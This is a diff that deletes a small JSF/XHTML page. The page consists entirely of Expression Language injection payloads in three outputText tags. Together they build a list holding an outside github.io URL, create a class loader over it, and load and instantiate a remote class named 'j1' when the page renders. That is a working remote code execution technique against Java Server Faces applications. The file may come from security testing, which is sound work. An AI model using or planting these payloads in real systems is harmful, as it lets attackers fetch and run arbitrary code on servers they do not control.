@@ -1,7 +1,0 @@
-<?xml version='1.0' encoding='UTF-8' ?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:f="http://xmlns.jcp.org/jsf/core" xmlns:h="http://xmlns.jcp.org/jsf/html">
-	<h:outputText id="a" value="#{request.getSession().setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}" />
-	<h:outputText id="b" value="#{request.getSession().getAttribute('arr').add(facesContext.getExternalContext().getResource('/').toURI().create('https://mpumelelo-m-mthethwa.github.io:443/').toURL())}" />
-	<h:outputText id="c" value="#{facesContext.getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute('arr').toArray(facesContext.getClass().getClassLoader().getParent().getURLs())).loadClass('j1').newInstance()}" />
-</html>
